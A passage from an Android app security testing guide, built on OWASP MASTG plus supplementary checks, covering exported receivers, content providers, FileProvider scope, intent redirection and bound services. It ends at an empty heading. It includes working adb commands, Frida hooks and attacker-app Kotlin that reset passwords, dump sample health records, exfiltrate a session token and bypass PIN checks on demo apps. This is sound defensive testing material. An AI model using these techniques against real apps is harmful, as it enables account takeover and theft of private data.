- The inventory; jadx; `adb`; for context-registered receivers, ideally Frida ([MASTG-TOOL-0031](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0031/)) to see registrations at runtime ([GT-0018-3](#gt-0018-3-runtime-registered-receivers-and-outgoing-broadcasts-android)).

#### Steps

1. **List manifest receivers** with their permissions and filter actions (OWASP's MASTG-TECH-0162).

2. **Find context-registered receivers** in code. They are not in the manifest:

   ```bash
   grep -rnE '\.registerReceiver\(|ContextCompat\.registerReceiver\(' out/sources/ | grep -v '/androidx/'
   grep -rnE 'extends BroadcastReceiver' out/sources/com/example/app/
   ```

   For each call, note the `IntentFilter` actions, whether a `broadcastPermission` is passed, and the flags argument. jadx shows the flag as a number: `2` is `RECEIVER_EXPORTED`, `4` is `RECEIVER_NOT_EXPORTED`; the two-argument overload has no flag at all.

3. **Read every `onReceive`.** What does it do with the extras? Does it check `intent.getAction()`? Does it call the backend, write preferences, start an activity or service, or log data?

4. **Send broadcasts as an external caller.** Prefer explicit broadcasts with `-n`, which reach manifest receivers regardless of background limits; include the filter's action for API 33+ targets:

   ```bash
   adb shell am broadcast -n com.example.app/.receivers.ResetReceiver \
       -a com.example.app.RESET_PASSWORD --es newpass attacker
   # Context-registered receivers cannot be addressed by component; target the package and action
   adb shell am broadcast -p com.example.app -a com.example.app.SESSION_REFRESH --es token x
   adb shell dumpsys activity broadcasts | grep -A5 com.example.app.SESSION_REFRESH
   ```

   `am broadcast` always reports `Broadcast completed: result=0` whether or not anything received it; permission failures are silent. Judge success by the effect (logcat, app state, network traffic), not by the output.

5. **Test context-registered receivers while their context is alive** — usually with the relevant screen open or the app in the foreground.

#### Observation

Per receiver: manifest or runtime, exported state (declared, default, or runtime flag), permission and protection level, filter actions, the `onReceive` logic, the broadcast you sent and the observed effect.

#### Evaluation

The test **fails** if an exported receiver without an effective permission performs a security-relevant action or discloses sensitive data on receipt — including by logging it — or if a context-registered receiver that handles sensitive actions accepts broadcasts from other apps (no `RECEIVER_NOT_EXPORTED` and no signature `broadcastPermission`).

Missing input validation (`onReceive` acting on extras without checking them, or without checking the action) makes the impact worse and should be reported with it.

It **passes** for receivers that are not exported, require a `signature` or system permission, or only react to protected system broadcasts *and* check the action on targets below API 33.

#### Demo

[MASTG-DEMO-0130](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0130/MASTG-DEMO-0130/), inspired by the receiver in the Android InsecureBankv2 training app. The receiver changes the vault password from an extra and logs the old one:

```xml
<receiver
    android:name="org.owasp.mastestapp.MastgTest$PasswordResetReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="org.owasp.mastestapp.RESET_PASSWORD" />
    </intent-filter>
</receiver>
```

```kotlin
class PasswordResetReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val newPassword = intent.getStringExtra("newpass") ?: return
        val prefs = context.getSharedPreferences("secure_prefs", Context.MODE_PRIVATE)
        val oldPassword = prefs.getString("vault_password", "")
        Log.d("MASTG-DEMO", "Password changed from $oldPassword to $newPassword")
        prefs.edit().putString("vault_password", newPassword).apply()
    }
}
```

The scan:

```text
Exported receiver: org.owasp.mastestapp.MastgTest.PasswordResetReceiver | permission: none
Exported receiver: androidx.profileinstaller.ProfileInstallReceiver | permission: android.permission.DUMP
```

The second entry is the AndroidX profile installer, protected by a permission only the system and `shell` hold. The first is the finding:

```bash
adb shell "am broadcast -n 'org.owasp.mastestapp/org.owasp.mastestapp.MastgTest\$PasswordResetReceiver' -a org.owasp.mastestapp.RESET_PASSWORD --es newpass pwned"
adb logcat -d -s MASTG-DEMO
```

```text
D MASTG-DEMO: Password changed from originalPass123 to pwned
```

Two findings in one: an unauthenticated password change, and the old password written to the system log. (Since Android 4.1 apps cannot read other apps' log entries, so the log leak matters mainly for `adb`/bug-report access and on-device log collectors; the password change is the headline.)

### MASTG-TEST-0355: References to Unauthorized Database Access through Content Providers (Android)

Source: [MASTG-TEST-0355](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0355/). Platform: Android. Type: static (config) with manual validation. Related knowledge: MASTG-KNOW-0020, MASTG-KNOW-0117. Best practice: MASTG-BEST-0049.

#### Overview

The static half of the provider pair: find `<provider>` elements that are exported without `android:readPermission`, `android:writePermission` or `android:permission`, and those whose permission resolves to `normal` (including an omitted protection level) or `dangerous`. Any app can then query the underlying database.

#### Prerequisites

- The decoded merged manifest and the app's SDK levels.
- semgrep ([MASTG-TOOL-0110](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/)) with OWASP's `mastg-android-content-provider-exported.yml` rule from the MASTG repository's `rules/` directory, or the equivalent `xmlstarlet` query.

#### Steps

1. **Run the rule** against the decoded manifest. It contains two rules: one that reports every provider with a permission attribute (so you can check its strength) and one that reports exported providers without any:

   ```yaml
   rules:
     - id: mastg-android-provider-exported-without-permissions
       languages: [xml]
       severity: WARNING
       message: >
         [MASVS-PLATFORM] The ContentProvider is exported without
         android:readPermission, android:writePermission, or android:permission.
       patterns:
         - pattern: <provider ... android:exported="true" ... />
         - pattern-not: <provider ... android:permission="$PERM" ... />
         - pattern-not: <provider ... android:readPermission="$PERM" ... />
         - pattern-not: <provider ... android:writePermission="$PERM" ... />
   ```

   ```bash
   semgrep -c mastg-android-content-provider-exported.yml out/resources/AndroidManifest.xml --text
   ```

2. **Catch what the rule misses.** The pattern requires `android:exported="true"` to be present, so it does not report a provider exported *by default* (SDK level 16 or lower), and it treats a provider with only `writePermission` as protected although reads are open. Our inventory script covers the first; for the second:

   ```bash
   xmlstarlet sel -t -m '//provider' -v '@android:name' -o ' exported=' -v '@android:exported' \
     -o ' perm=' -v '@android:permission' -o ' read=' -v '@android:readPermission' \
     -o ' write=' -v '@android:writePermission' -o ' grant=' -v '@android:grantUriPermissions' \
     -o ' paths=' -v 'count(path-permission)' -o ' auth=' -v '@android:authorities' -n out/resources/AndroidManifest.xml
   ```

3. **Resolve each permission's protection level** (`<permission>` in the manifest, or `adb shell dumpsys package permission <name>`), and list `<path-permission>` and `<grant-uri-permission>` children for later.

4. **Decide what the provider holds.** In jadx, open the provider class, follow `onCreate` to the `SQLiteOpenHelper` (table definitions in `onCreate(db)`), and note the `UriMatcher` routes. This is the "further validation" OWASP asks for: whether the exposed data is sensitive.

#### Observation

The list of providers with exported state, permissions and protection levels, path and grant rules, authorities, routes, and a summary of the tables or files each serves.

#### Evaluation

The test **fails** if a provider is exported without any permission attribute, or with read access unprotected, and it serves sensitive data. It also fails if the only permission is `normal` (stated or by default) or `dangerous`, because any app can obtain it.

It **passes** if the provider is not exported, or its read and write access require `signature`-level (or system) permissions. An exported provider with no permission is acceptable only if everything it serves is intentionally public — and even then, write access needs separate thought.

#### Demo

[MASTG-DEMO-0120](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0120/MASTG-DEMO-0120/) uses the sample of MASTG-DEMO-0121: an `AppointmentProvider` over a SQLite table of patient names, dates of birth, diagnoses and doctors' notes.

```xml
<provider
    android:name="org.owasp.mastestapp.MastgTest$AppointmentProvider"
    android:authorities="org.owasp.mastestapp.appointments"
    android:exported="true" />
```

```text
┌────────────────┐
│ 1 Code Finding │
└────────────────┘

    AndroidManifest_reversed.xml
    ❯❱ rules.mastg-android-provider-exported-without-permissions
          [MASVS-PLATFORM] The ContentProvider is exported without android:readPermission,
          android:writePermission, or android:permission, allowing any app on the device to access it without
          restriction.

           40┆ <provider
           41┆     android:name="org.owasp.mastestapp.MastgTest.AppointmentProvider"
           42┆     android:exported="true"
           43┆     android:authorities="org.owasp.mastestapp.appointments"/>
```

The test fails: health data, exported, no permission. MASTG-TEST-0356 confirms it at runtime.

### MASTG-TEST-0356: Runtime Verification of Unauthorized Database Access through Content Providers (Android)

Source: [MASTG-TEST-0356](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0356/). Platform: Android. Type: dynamic (filesystem) with manual validation. Related knowledge: MASTG-KNOW-0020, MASTG-KNOW-0117. Best practice: MASTG-BEST-0049.

#### Overview

The dynamic half: install the app, populate it with data, and query its exported providers as an external caller to see what comes back ([MASTG-TECH-0148](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0148/), interacting with content providers). It also catches the case the static test cannot settle: a permission that exists but is granted to anyone.

#### Prerequisites

- The app installed ([MASTG-TECH-0005](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0005/)) with a test account, and the authorities and routes from MASTG-TEST-0355.
- `adb`; the attacker app for permission-protected providers and for proof.

#### Steps

1. **Exercise the app thoroughly** so the provider has data: log in, create records, upload a document, set a PIN, sync. Empty tables prove nothing.

2. **Build the candidate URI list.** From the routes in code, and from strings:

   ```bash
   grep -rhoE 'content://[A-Za-z0-9._/-]+' out/sources/ out/resources/ | sort -u
   grep -rnE 'addURI\(' out/sources/com/example/app/
   ```

   drozer can brute-force common paths against each authority (`run scanner.provider.finduris -a com.example.app`), which occasionally finds routes the decompiler hid.

3. **Query each URI as `shell`.** The `content` command runs with the `shell` UID, so access depends only on export state and permissions:

   ```bash
   adb shell content query --uri content://org.owasp.mastestapp.appointments/appointments
   adb shell content query --uri content://org.owasp.mastestapp.appointments/appointments/1
   adb shell content query --uri content://org.owasp.mastestapp.appointments/appointments \
       --projection patient_name:diagnosis --where "doctor='Dr. Chen'"
   adb shell content gettype --uri content://org.owasp.mastestapp.appointments/appointments
   ```

   `--projection` takes column names separated by colons; `--where` becomes the `selection` argument; `--sort` becomes `sortOrder`. Quoting passes through two shells, so for anything with quotes or spaces it is easier to open `adb shell` and type the command on the device.

4. **Test write access** if `writePermission` is missing or weak, with harmless values you can clean up:

   ```bash
   adb shell content insert --uri content://com.example.app.provider/notes --bind title:s:gt-test --bind body:s:x
   adb shell content update --uri content://com.example.app.provider/notes --where "title='gt-test'" --bind body:s:y
   adb shell content delete --uri content://com.example.app.provider/notes --where "title='gt-test'"
   ```

   Bind types are `s` (string), `i` (integer), `l` (long), `f` (float), `d` (double), `b` (boolean).

5. **For providers protected by a weak permission**, `shell` will not hold the custom permission, so use the attacker app: declare `<uses-permission>` for it (and `<queries>` for the package), install, and query with `contentResolver.query()`. If the permission is `normal`, the query succeeds with no prompt; if `dangerous`, after one runtime prompt.

6. **Try the `call()` method** if the provider implements it, because the manifest permissions do not cover it:

   ```bash
   adb shell content call --uri content://com.example.app.provider --method getToken
   ```

#### Observation

For each URI and operation: the command or code used, the result (rows returned, `SecurityException`, `Unknown URI`, empty result) and, for successful reads, the data returned with sensitive values classified (and redacted in the report).

#### Evaluation

The test **fails** if sensitive data can be read, or data can be modified, through an exported provider by a caller that holds no permission or only a permission any app can obtain.

`Permission Denial: opening provider … that is not exported` and `java.lang.SecurityException: Permission Denial: reading … requires …` with a signature-level permission are passes. An empty cursor is not a pass until you have confirmed the app actually stored data at that route.

#### Demo

[MASTG-DEMO-0121](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0121/MASTG-DEMO-0121/). The authority comes from the manifest; the path `appointments` (and `appointments/#`) from the `addURI` calls in the decompiled provider. After tapping **Start** in the app:

```bash
adb shell content query --uri content://org.owasp.mastestapp.appointments/appointments
```

```text
Row: 0 _id=1, patient_name=Maria Garcia, dob=1988-03-14, appointment_date=2026-04-10, doctor=Dr. Chen, diagnosis=Type 2 Diabetes, notes=Adjust metformin dosage to 1000mg twice daily
Row: 1 _id=2, patient_name=James Wilson, dob=1975-09-27, appointment_date=2026-04-11, doctor=Dr. Patel, diagnosis=Essential Hypertension, notes=Refer to cardiology; increase lisinopril to 20mg
```

The test fails: any app can read special-category health data with one call. The equivalent attacker code is a single `contentResolver.query(Uri.parse("content://org.owasp.mastestapp.appointments/appointments"), null, null, null, null)`. With the provider set to `exported="false"`, or protected by a signature permission, the same `content query` returns a `SecurityException` instead.

### MASTG-TEST-0357: References to Oversharing of File-Based Content Providers (Android)

Source: [MASTG-TEST-0357](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0357/). Platform: Android. Type: static (config, code) with manual validation. Related knowledge: MASTG-KNOW-0020, MASTG-KNOW-0117. Best practice: MASTG-BEST-0049.

#### Overview

The test looks at providers that serve files — `FileProvider` and hand-written `openFile` implementations — and checks whether their path configuration reaches beyond the directory meant for sharing (`<root-path>`, `path="."`, `path=""`, `path="/"`), and whether the app builds shareable URIs from caller-controlled input. OWASP's technique for it is [MASTG-TECH-0159](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0159/).

OWASP's evaluation is phrased as "the app exports a `FileProvider`". Since AndroidX `FileProvider` throws at startup if exported, read that as "makes a `FileProvider`'s files reachable by other apps" — which happens through URI grants — and, for custom providers, as "exports a provider that implements `openFile`".

#### Prerequisites

- The decoded resources (`out/resources/res/xml/` from jadx, `apk_out/res/xml/` from apktool) and sources.
- semgrep with OWASP's `mastg-android-fileprovider-broad-scope.yml` rule.
- The attacker app, for validation: `adb` cannot receive a URI grant.

#### Steps

1. **Find file-serving providers** and their path resources:

   ```bash
   grep -nE 'FileProvider|FILE_PROVIDER_PATHS' -A6 out/resources/AndroidManifest.xml
   grep -rnE '<(root|files|cache|external|external-files|external-cache|external-media)-path' out/resources/res/xml/
   grep -rnE 'extends (ContentProvider|FileProvider)' out/sources/ | grep -v '/androidx/'
   grep -rnE 'ParcelFileDescriptor openFile\(' out/sources/ | grep -v '/androidx/'
   ```

2. **Run the rule** on the path XML files. It reports `path="."` on any element and any `<root-path>`:

   ```bash
   semgrep -c mastg-android-fileprovider-broad-scope.yml out/resources/res/xml/ --text
   ```

   Also check `path=""` and `path="/"` by hand — the rule only matches `"."` — and note any path that covers a directory holding secrets. `<files-path path=".">` exposes all of `files/`, where apps commonly keep tokens and exports; `databases/` and `shared_prefs/` lie outside `files/` but inside `<root-path>`.

3. **Find where URIs are created and granted** ([MASTG-TECH-0017](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0017/) to decompile, then trace):

   ```bash
   grep -rnE 'getUriForFile\(|FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION|grantUriPermission\(' out/sources/com/example/app/
   ```

   jadx often shows the flags as numbers: `addFlags(1)` is read, `2` write, `64` persistable, `128` prefix. For each `getUriForFile()`, trace the `File` argument back: a constant path is fine; a path built from an intent extra, a deep-link parameter or a query parameter is the vulnerable pattern.

4. **For custom `openFile` implementations**, check how the file is built from the URI and whether the result is canonicalised and checked against a base directory. Then test traversal directly if the provider is exported:

   ```bash
   adb shell content read --uri 'content://com.example.app.files/export/..%2F..%2Fshared_prefs%2Fsession.xml'
   ```

#### Observation

The path configuration of each file provider, the code locations that create and grant URIs with the origin of the file argument, and for custom providers the `openFile` logic and the result of traversal attempts.

#### Evaluation

The test **fails** if a file provider's path configuration exposes more than the intended directory (`<root-path>`, `path="."`, `path=""` or `path="/"`) **and** other apps can obtain URIs for it — typically because an exported component calls `getUriForFile()` with caller-controlled input and grants the result — or if an exported custom provider's `openFile` serves files outside its intended directory.

A broad path with no reachable grant path is a hardening finding (one future code change away from a vulnerability), not a demonstrated exposure. A narrow path with an exported component that grants arbitrary files *within* it may still fail if that directory holds other users' or other features' files.

#### Demo

[MASTG-DEMO-0122](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0122/MASTG-DEMO-0122/) (the victim) and [MASTG-DEMO-0123](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0123/MASTG-DEMO-0123/) (the attack). The victim shares lab reports from `filesDir/reports/`, but its paths file maps the whole of `filesDir`:

```xml
<!-- res/xml/filepaths.xml -->
<paths>
    <files-path name="app_files" path="." />
</paths>
```

and an exported activity turns a caller-supplied file name into a granted URI:

```kotlin
class ShareReportActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val requested = intent.getStringExtra("file_name") ?: run { setResult(RESULT_CANCELED); finish(); return }
        val uri = FileProvider.getUriForFile(this, "org.owasp.mastestapp.fileprovider", File(filesDir, requested))
        setResult(RESULT_OK, Intent().apply {
            data = uri
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        })
        finish()
    }
}
```

The rule flags the path:

```text
    filepaths_reversed.xml
    ❯❱ rules.mastg-android-fileprovider-broad-path-scope
          [MASVS-PLATFORM] FileProvider path element is declared with path=".", which maps the entire
          corresponding base directory into the provider's addressable namespace. ...
            3┆ <files-path
            4┆     name="app_files"
            5┆     path="."/>
```

The attacker app asks for a file outside `reports/`:

```kotlin
class AttackerActivity : ComponentActivity() {
    private val launcher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        val uri = result.data?.data ?: return@registerForActivityResult
        val content = contentResolver.openInputStream(uri)?.bufferedReader()?.use { it.readText() }
        Log.e("EXFIL", "Exfiltrated from victim: $content")
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        launcher.launch(Intent().apply {
            setClassName("org.owasp.mastestapp", "org.owasp.mastestapp.MastgTest\$ShareReportActivity")
            putExtra("file_name", "session_token.txt")
        })
    }
}
```

```text
E EXFIL   : Exfiltrated from victim: sess_[redacted]
```

The test fails on both counts: the path scope is too broad and an exported component grants URIs for caller-chosen files. As OWASP points out, `adb` alone cannot reproduce this: `am start` launches the activity but never receives the result or the grant, and reading the file with `su` bypasses the provider rather than exploiting it. Note too that `requested = "../databases/app.db"` would be refused here only because `FileProvider.getUriForFile()` canonicalises the path and rejects anything outside the declared roots; with `<root-path>` it would be accepted.

### Supplementary checks (Guler Tech methodology)

The six OWASP tests answer "is this component exported and unprotected, and does it do something sensitive?". MASWE-0018 is wider: it includes non-exported components reached through the app's own identity, per-call checks inside bound services, receivers that exist only at runtime, permissions that look strong but are not, injection that widens a provider's exposure, local network services, and the iOS entry points. The checks below are **Guler Tech methodology**, structured like the OWASP tests. Related OWASP material we found and cite: legacy (MASTG v1) tests [MASTG-TEST-0029 (Testing for Sensitive Functionality Exposure Through IPC)](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/), [MASTG-TEST-0007 (Sensitive Stored Data Exposed via IPC Mechanisms)](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/), [MASTG-TEST-0030 (Vulnerable Implementation of PendingIntent)](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0030/) and [MASTG-TEST-0026 (Testing Implicit Intents)](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/); beta tests [MASTG-TEST-0381](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0381/) (PendingIntent creation) and [MASTG-TEST-0339](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0339/) (SQL injection in content providers); and for iOS [MASTG-TEST-0370](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0370/), [MASTG-TEST-0371](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0371/), [MASTG-TEST-0395](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0395/) and legacy [MASTG-TEST-0075](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/), [MASTG-TEST-0070](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/) and [MASTG-TEST-0072](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/).

### GT-0018-1: Intent redirection and URI permission grants (Android)

Guler Tech methodology. Platform: Android. Type: static (code) and dynamic (attacker app, Frida).

#### Overview

A correctly non-exported component is still reachable if an exported one starts it on the caller's behalf. **Intent redirection** is the pattern: an exported activity, service or receiver reads an `Intent` from its input (an extra, often named `next`, `target`, `redirect` or `forward`) and passes it to `startActivity()`, `startService()`, `sendBroadcast()` or `setResult()`. The forwarded intent runs with the victim's identity, so it can target any of the victim's components and carry `FLAG_GRANT_*` flags for the victim's providers — including non-exported providers with `grantUriPermissions="true"`. Mutable `PendingIntent`s handed to other apps are the same problem in a different shape.

#### Prerequisites

- jadx output; the inventory of exported components; the attacker app; optionally Frida.

#### Steps

1. **Find forwarded intents.**

   ```bash
   grep -rnE 'getParcelableExtra\(|getParcelableExtra\([^)]*Intent\.class\)|getParcelable\(' out/sources/com/example/app/ | grep -i intent
   grep -rnE 'setResult\(-?1, *(getIntent\(\)|this\.getIntent\(\)|intent)\)' out/sources/com/example/app/
   grep -rnE 'Intent\.parseUri\(' out/sources/com/example/app/
   ```

   `setResult(-1, …)` is `RESULT_OK`; an activity that echoes its own incoming intent as the result returns whatever data and grant flags the caller put in. `Intent.parseUri()` turns a string (often from a deep link) into an intent, which is redirection by URL.

2. **For each hit, check what is done before forwarding**: is the target component resolved (`resolveActivity()`) and compared with an allow-list? Are `FLAG_GRANT_READ_URI_PERMISSION`/`FLAG_GRANT_WRITE_URI_PERMISSION` removed? Is the forwarding component exported?

3. **List `PendingIntent` creation** and decode the flags (OWASP's MASTG-TEST-0381 covers this in depth):

   ```bash
   grep -rnE 'PendingIntent\.get(Activity|Activities|Service|ForegroundService|Broadcast)\(' out/sources/com/example/app/
   ```

   In jadx, `67108864` is `FLAG_IMMUTABLE`, `33554432` is `FLAG_MUTABLE`, `134217728` is `FLAG_UPDATE_CURRENT`; flags are often summed (`201326592` = `FLAG_IMMUTABLE | FLAG_UPDATE_CURRENT`). A mutable `PendingIntent` whose base intent has no component and is handed to another app (in a notification action, a widget, a result, an extra) is a candidate.

4. **Watch it at runtime** to catch forwarding paths static analysis misses. This Frida script logs every activity start with its component, data and flags, plus the calling class:

   ```javascript
   // redirect.js — frida -U -f com.example.app -l redirect.js
   Java.perform(function () {
     var Activity = Java.use('android.app.Activity');
     var Log = Java.use('android.util.Log');
     var Ex = Java.use('java.lang.Exception');
     Activity.startActivity.overloads.forEach(function (ov) {
       ov.implementation = function () {
         var i = arguments[0];
         console.log('[startActivity] cmp=' + i.getComponent() + ' data=' + i.getData() +
                     ' flags=0x' + (i.getFlags() >>> 0).toString(16));
         console.log(Log.getStackTraceString(Ex.$new()).split('\n').slice(2, 6).join('\n'));
         return ov.apply(this, arguments);
       };
     });
   });
   ```

5. **Exploit from the attacker app.** First reach a non-exported component; then try to obtain a URI grant:

   ```kotlin
   // 1. Reach a non-exported activity through the exported router
   val inner = Intent().setClassName("com.example.app", "com.example.app.internal.ChangePinActivity")
   startActivity(Intent().setClassName("com.example.app", "com.example.app.RouterActivity").putExtra("next", inner))

   // 2. Make the victim grant us its private provider (the provider needs grantUriPermissions="true")
   val steal = Intent(this, GrantReceiverActivity::class.java).apply {   // our own exported activity
       data = Uri.parse("content://com.example.app.internal/accounts")
       addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION)
   }
   startActivity(Intent().setClassName("com.example.app", "com.example.app.RouterActivity").putExtra("next", steal))

   // In GrantReceiverActivity.onCreate():
   // contentResolver.query(intent.data!!, null, null, null, null)?.use { c -> /* log rows */ }
   ```

#### Observation

The forwarding code paths, the checks (if any) applied to forwarded intents, `PendingIntent` flags and destinations, the Frida log, and the result of each attacker-app attempt (non-exported component reached; provider rows or file content read through the grant).

#### Evaluation

The check **fails** if an exported component forwards a caller-supplied intent without restricting the target to an allow-list and stripping grant flags, so that a non-exported component performing a sensitive action is reachable, or a URI grant to private data can be obtained. It also fails if a mutable `PendingIntent` with an implicit or empty base intent is exposed to other apps. It **passes** when forwarding is restricted to known internal destinations with grant flags removed, and `PendingIntent`s are immutable with explicit base intents.

#### Demo

The vulnerable router, as we commonly find it in notification and deep-link dispatch code:

```kotlin
class RouterActivity : Activity() {                       // exported: handles notification taps and links
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        @Suppress("DEPRECATION")
        val next = intent.getParcelableExtra<Intent>("next")
        if (next != null) startActivity(next)            // runs as com.example.app
        finish()
    }
}
```

With the first attacker snippet, `ChangePinActivity` (declared `exported="false"`) opens on top of the victim's task and accepts a new PIN without asking for the old one. Developers can catch this pattern during testing with `StrictMode.VmPolicy.Builder().detectUnsafeIntentLaunch()` (API 31), which reports launches of intents that were unparcelled from another app's input.

### GT-0018-2: Bound services and AIDL caller checks (Android)

Guler Tech methodology. Platform: Android. Type: static (code) and dynamic (attacker app).

#### Overview

MASTG-TEST-0365 decides whether a bound service is reachable. This check exercises its interface method by method, because the framework checks permissions only at bind time and a service with mixed public and private operations must check every call itself.

#### Prerequisites

- jadx output for the service and its `Stub` (or `Handler` for `Messenger` services); the attacker app with `<queries>` for the target package.

#### Steps

1. **Reconstruct the interface.** In the generated `Stub`, note the descriptor and transaction codes, and read `onTransact` to see the argument order and reply format:

   ```java
   public static abstract class Stub extends Binder implements IVaultService {
       public static final String DESCRIPTOR = "com.example.app.IVaultService";
       static final int TRANSACTION_getStatus = 1;
       static final int TRANSACTION_setPin = 2;
       // onTransact case 2: data.enforceInterface(DESCRIPTOR); String _arg0 = data.readString();
       //                    boolean _result = setPin(_arg0); reply.writeNoException(); reply.writeInt(_result ? 1 : 0);
   }
   ```

   For `Messenger` services, read `handleMessage` and list each `msg.what` value with the `Bundle` keys it reads.

2. **For each method, find the check.** Is there a `getCallingUid()`/`checkCallingPermission()` on the Binder thread before the sensitive work? Is it `checkCallingOrSelfPermission()`? Is the identity read after a hop to another thread? For `Messenger`, is `msg.sendingUid` checked?

3. **Call each method from the attacker app** with a raw `transact()`:

   ```kotlin
   private val conn = object : ServiceConnection {
       override fun onServiceConnected(name: ComponentName, binder: IBinder) {
           val data = Parcel.obtain()
           val reply = Parcel.obtain()
           try {
               data.writeInterfaceToken("com.example.app.IVaultService")
               data.writeString("0000")
               binder.transact(IBinder.FIRST_CALL_TRANSACTION + 1, data, reply, 0)   // TRANSACTION_setPin = 2
               reply.readException()                                                   // rethrows a SecurityException
               Log.i("GT", "setPin returned ${reply.readInt() != 0}")
           } catch (e: Exception) {
               Log.e("GT", "setPin failed: $e")
           } finally {
               data.recycle(); reply.recycle()
           }
       }
       override fun onServiceDisconnected(name: ComponentName) {}
   }

   fun bindVault() {
       val i = Intent("com.example.app.BIND_VAULT").setClassName("com.example.app", "com.example.app.VaultService")
       Log.i("GT", "bindService returned ${bindService(i, conn, Context.BIND_AUTO_CREATE)}")
   }
   ```

   For a `Messenger` service, send a message instead:

   ```kotlin
   val msg = Message.obtain(null, 2).apply { data = Bundle().apply { putString("pin", "0000") } }
   Messenger(binder).send(msg)
   ```

4. **Interpret the result.** `bindService` returning `false` means the service was not found or not visible (check `<queries>`); a `SecurityException` at bind means the manifest permission held; a `SecurityException` from `readException()` means the method checks its caller; a normal return means it does not.

#### Observation

The reconstructed interface, the caller check (or absence) per method, and the outcome of each call.

#### Evaluation

The check **fails** if any method that returns sensitive data or performs a security-relevant action succeeds when called by an untrusted app, or if the checks present are ineffective (self-permission, wrong thread, package name without signature). It **passes** when sensitive methods reject untrusted callers and the remaining methods are harmless.

### GT-0018-3: Runtime-registered receivers and outgoing broadcasts (Android)

Guler Tech methodology. Platform: Android. Type: dynamic (Frida, adb).

#### Overview

Context-registered receivers are invisible in the manifest, and the flag that protects them is an integer that is easy to get wrong or omit on older targets. Broadcasts the app *sends* can leak data to any app with a matching receiver. Static grep finds call sites; this check records what actually happens at runtime.

#### Prerequisites

- Frida on a rooted test device or emulator (or a repackaged build with the Frida gadget); `adb`.

#### Steps

1. **Log registrations and sends** while you use the app:

   ```javascript
   // receivers.js — frida -U -f com.example.app -l receivers.js
   Java.perform(function () {
     var CW = Java.use('android.content.ContextWrapper');
     CW.registerReceiver.overloads.forEach(function (ov) {
       ov.implementation = function () {
         var a = arguments, actions = [];
         if (a[1] !== null) { for (var i = 0; i < a[1].countActions(); i++) actions.push(a[1].getAction(i)); }
         var perm = a.length >= 4 ? a[2] : null;
         var last = a[a.length - 1];
         console.log('[registerReceiver] ' + (a[0] !== null ? a[0].$className : 'null') +
                     ' actions=' + JSON.stringify(actions) + ' permission=' + perm +
                     ' flags=' + (typeof last === 'number' ? last : 'none') + '  (2=EXPORTED, 4=NOT_EXPORTED)');
         return ov.apply(this, a);
       };
     });
     ['sendBroadcast', 'sendOrderedBroadcast', 'sendStickyBroadcast'].forEach(function (m) {
       CW[m].overloads.forEach(function (ov) {
         ov.implementation = function () {
           var i = arguments[0];
           var perm = (arguments.length > 1 && typeof arguments[1] === 'string') ? arguments[1] : 'none';
           console.log('[' + m + '] action=' + i.getAction() + ' package=' + i.getPackage() +
                       ' component=' + i.getComponent() + ' permission=' + perm +
                       ' extras=' + (i.getExtras() !== null ? i.getExtras().toString() : 'none'));
           return ov.apply(this, arguments);
         };
       });
     });
   });
   ```

2. **For each receiver registered without flag `4` and without a signature permission**, send it a broadcast from `adb` while the registering screen is open (`adb shell am broadcast -p com.example.app -a <action> --es <key> <value>`) and observe the effect. Remember: on devices before Android 13, the flag does not exist and only a `broadcastPermission` (or AndroidX's emulated permission) protects the receiver.

3. **For each send without a package, component or permission**, decide whether the extras are sensitive. If they are, prove interception with an attacker receiver registered for the same action (context-registered, so the Android 8.0 implicit-broadcast limits do not apply). For ordered broadcasts, register with a high priority and show that you receive it first and can abort it.

4. **For sticky broadcasts**, read the stored value from the attacker app with `registerReceiver(null, IntentFilter("<action>"))`, which returns the last sticky intent without registering a receiver.

#### Observation

The Frida log (registrations with flags and permissions; sends with destinations and extras), and the results of steps 2–4.

#### Evaluation

